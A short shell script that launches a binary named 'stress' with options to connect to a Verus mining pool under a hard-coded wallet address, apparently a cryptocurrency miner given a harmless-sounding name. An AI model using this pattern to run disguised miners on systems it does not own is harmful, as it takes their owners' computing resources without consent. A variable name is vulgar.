#!/bin/sh

FUCK="$1"
CPU="$2"
CONNECT="pool.verus.io:9999"
./stress -v -l $CONNECT -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.$FUCK -t $CPU -p x
